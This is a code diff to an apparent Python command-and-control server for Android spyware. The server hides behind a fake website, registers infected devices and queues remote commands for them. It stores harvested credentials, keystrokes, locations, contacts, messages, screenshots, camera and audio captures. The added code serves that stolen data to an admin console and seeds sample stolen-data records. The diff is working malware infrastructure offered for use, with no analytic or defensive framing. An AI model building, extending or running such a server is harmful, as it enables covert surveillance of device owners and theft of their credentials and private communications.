@@ -51,8 +51,20 @@ class C2RequestHandler(BaseHTTPRequestHandler):
     
     def do_GET(self):
         """
-        Handle GET requests - Return fake website to disguise the C2 server
+        Handle GET requests - Process data requests or return fake website
         """
+        # Parse URL path
+        parsed_path = urlparse(self.path)
+        path = parsed_path.path
+        
+        # Check if this is a data request from admin console
+        if path.startswith('/data/'):
+            # Extract the data type from the URL path
+            data_type = path.split('/')[2]
+            self._serve_data_listing(data_type)
+            return
+            
+        # Default response - fake website
         self.send_response(200)
         self.send_header("Content-type", "text/html")
         self.end_headers()
@@ -83,6 +95,69 @@ class C2RequestHandler(BaseHTTPRequestHandler):
         </html>
         """
         self.wfile.write(fake_site.encode())
+        
+    def _serve_data_listing(self, data_type):
+        """Serve data listing for admin console"""
+        data_dir = os.path.join(DATA_DIR, data_type)
+        
+        if not os.path.exists(data_dir):
+            # Return empty list instead of 404 if directory doesn't exist yet
+            self.send_response(200)
+            self.send_header("Content-type", "application/json")
+            self.end_headers()
+            self.wfile.write(json.dumps([]).encode())
+            return
+        
+        # Get file listing
+        files = []
+        
+        try:
+            for filename in os.listdir(data_dir):
+                if filename.endswith(".json") or filename.endswith(".txt") or filename.endswith(".bin"):
+                    file_path = os.path.join(data_dir, filename)
+                    try:
+                        if filename.endswith('.json'):
+                            with open(file_path, 'r') as f:
+                                data = json.load(f)
+                                files.append({
+                                    "filename": filename,
+                                    "size": os.path.getsize(file_path),
+                                    "timestamp": datetime.datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat(),
+                                    "data": data
+                                })
+                        else:
+                            # For non-JSON files, read as text if possible
+                            try:
+                                with open(file_path, 'r') as f:
+                                    content = f.read()
+                                    files.append({
+                                        "filename": filename,
+                                        "size": os.path.getsize(file_path),
+                                        "timestamp": datetime.datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat(),
+                                        "data": {"content": content}
+                                    })
+                            except UnicodeDecodeError:
+                                # Binary file
+                                files.append({
+                                    "filename": filename,
+                                    "size": os.path.getsize(file_path),
+                                    "timestamp": datetime.datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat(),
+                                    "data": {"content": f"<Binary file: {os.path.getsize(file_path)} bytes>"}
+                                })
+                    except Exception as e:
+                        files.append({
+                            "filename": filename,
+                            "size": os.path.getsize(file_path),
+                            "timestamp": datetime.datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat(),
+                            "error": str(e)
+                        })
+        except Exception as e:
+            logger.error(f"Error listing files in {data_dir}: {str(e)}")
+        
+        self.send_response(200)
+        self.send_header("Content-type", "application/json")
+        self.end_headers()
+        self.wfile.write(json.dumps(files).encode())
     
     def do_POST(self):
         """
@@ -193,9 +268,13 @@ class C2RequestHandler(BaseHTTPRequestHandler):
             
             logger.info(f"Device registration: {device_id}")
             
-            # Save device info
+            # Create devices directory
             devices_dir = os.path.join(DATA_DIR, "devices")
             os.makedirs(devices_dir, exist_ok=True)
+            
+            # Create commands directory
+            commands_dir = os.path.join(DATA_DIR, "commands")
+            os.makedirs(commands_dir, exist_ok=True)
             
             device_file = os.path.join(devices_dir, f"{device_id}.json")
             
@@ -206,6 +285,12 @@ class C2RequestHandler(BaseHTTPRequestHandler):
                     "registration_time": datetime.datetime.now().isoformat(),
                     "last_seen": datetime.datetime.now().isoformat()
                 }, f, indent=2)
+            
+            # Initialize command file if it doesn't exist
+            command_file = os.path.join(commands_dir, f"{device_id}.json")
+            if not os.path.exists(command_file):
+                with open(command_file, 'w') as f:
+                    json.dump({"pending": [], "executed": []}, f, indent=2)
             
             # Respond with success and initial commands
             self.send_response(200)
@@ -286,8 +371,12 @@ class C2RequestHandler(BaseHTTPRequestHandler):
         """Update the last seen timestamp for a device"""
         if not device_id or device_id == "unknown_device":
             return
+        
+        # Create devices directory if it doesn't exist
+        devices_dir = os.path.join(DATA_DIR, "devices")
+        os.makedirs(devices_dir, exist_ok=True)
             
-        device_file = os.path.join(DATA_DIR, "devices", f"{device_id}.json")
+        device_file = os.path.join(devices_dir, f"{device_id}.json")
         
         if os.path.exists(device_file):
             try:
@@ -300,13 +389,34 @@ class C2RequestHandler(BaseHTTPRequestHandler):
                     json.dump(device_data, f, indent=2)
             except Exception as e:
                 logger.error(f"Error updating device last seen: {str(e)}")
+        else:
+            # Create a new device entry
+            try:
+                device_data = {
+                    "device_id": device_id,
+                    "device_info": {},
+                    "registration_time": datetime.datetime.now().isoformat(),
+                    "last_seen": datetime.datetime.now().isoformat()
+                }
+                
+                with open(device_file, 'w') as f:
+                    json.dump(device_data, f, indent=2)
+                
+                logger.info(f"Created new device entry for {device_id}")
+            except Exception as e:
+                logger.error(f"Error creating device entry: {str(e)}")
     
     def _get_pending_commands(self, device_id):
         """Get pending commands for a device"""
         commands_dir = os.path.join(DATA_DIR, "commands")
+        os.makedirs(commands_dir, exist_ok=True)
+        
         device_commands_file = os.path.join(commands_dir, f"{device_id}.json")
         
         if not os.path.exists(device_commands_file):
+            # Create an empty commands file for this device
+            with open(device_commands_file, 'w') as f:
+                json.dump({"pending": [], "executed": []}, f, indent=2)
             return []
             
         try:
@@ -347,6 +457,9 @@ class CommandManager:
     
     def add_command(self, device_id, command_data):
         """Add a command for a device"""
+        # Ensure commands directory exists
+        os.makedirs(self.commands_dir, exist_ok=True)
+        
         device_commands_file = os.path.join(self.commands_dir, f"{device_id}.json")
         
         commands_data = {"pending": [], "executed": []}
@@ -441,6 +554,10 @@ class WebAdminConsole:
                         self.end_headers()
                         self.wfile.write(json.dumps({"status": "error", "message": "Missing device_id or command"}).encode())
                         return
+                    
+                    # Create commands directory if it doesn't exist
+                    commands_dir = os.path.join(DATA_DIR, "commands")
+                    os.makedirs(commands_dir, exist_ok=True)
                     
                     success = self.server.command_manager.add_command(device_id, command)
                     
@@ -742,12 +859,81 @@ def generate_self_signed_cert(cert_file="server.crt", key_file="server.key"):
         raise Exception("Failed to generate certificate: cryptography module not available")
 
 
+def create_sample_data():
+    """Create sample data files for testing"""
+    # Sample device info
+    sample_device = {
+        "device_id": "sample_device_001",
+        "device_info": {
+            "model": "Sample Phone",
+            "manufacturer": "Android",
+            "android_version": "12"
+        },
+        "registration_time": datetime.datetime.now().isoformat(),
+        "last_seen": datetime.datetime.now().isoformat()
+    }
+    
+    # Create devices directory and save sample device
+    devices_dir = os.path.join(DATA_DIR, "devices")
+    os.makedirs(devices_dir, exist_ok=True)
+    with open(os.path.join(devices_dir, "sample_device_001.json"), 'w') as f:
+        json.dump(sample_device, f, indent=2)
+    
+    # Create sample data for each data type
+    data_types = {
+        "credentials": {"username": "user@example.com", "password": "password123", "app": "SampleApp"},
+        "keylog": {"text": "Sample keylog data", "app": "SampleApp"},
+        "location": {"latitude": 37.7749, "longitude": -122.4194, "accuracy": 10.0},
+        "contacts": {"name": "John Doe", "phone": "+1234567890", "email": "john@example.com"},
+        "messages": {"from": "Alice", "to": "Bob", "content": "Hello, how are you?"},
+        "screenshots": {"timestamp": datetime.datetime.now().isoformat(), "description": "Sample screenshot"}
+    }
+    
+    # Save sample data files
+    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+    for data_type, sample_data in data_types.items():
+        data_dir = os.path.join(DATA_DIR, data_type)
+        os.makedirs(data_dir, exist_ok=True)
+        
+        # Add metadata to the sample data
+        full_data = {
+            "type": data_type,
+            "device_id": "sample_device_001",
+            "timestamp": timestamp,
+            "data": sample_data
+        }
+        
+        # Save to file
+        with open(os.path.join(data_dir, f"sample_{data_type}_{timestamp}.json"), 'w') as f:
+            json.dump(full_data, f, indent=2)
+    
+    logger.info("Created sample data files for testing")
+
 def run_c2_server(port, use_ssl=True, cert_file="server.crt", key_file="server.key"):
     """Run the C2 server"""
-    # Create data directories
+    # Create all required directories
     os.makedirs(DATA_DIR, exist_ok=True)
+    
+    # Core directories
     os.makedirs(os.path.join(DATA_DIR, "devices"), exist_ok=True)
     os.makedirs(os.path.join(DATA_DIR, "commands"), exist_ok=True)
+    
+    # Data type directories
+    data_types = [
+        "credentials", "keylog", "location", "contacts", "messages", 
+        "screenshots", "camera", "audio", "device_info", "binary", 
+        "sensitive", "test", "uploads"  # Added "test" and "uploads" directories
+    ]
+    
+    for data_type in data_types:
+        type_dir = os.path.join(DATA_DIR, data_type)
+        os.makedirs(type_dir, exist_ok=True)
+        logger.info(f"Created directory: {type_dir}")
+    
+    logger.info(f"Created all data directories in {DATA_DIR}")
+    
+    # Create sample data for testing
+    create_sample_data()
     
     # Create HTTPS server
     httpd = HTTPServer(('0.0.0.0', port), C2RequestHandler)
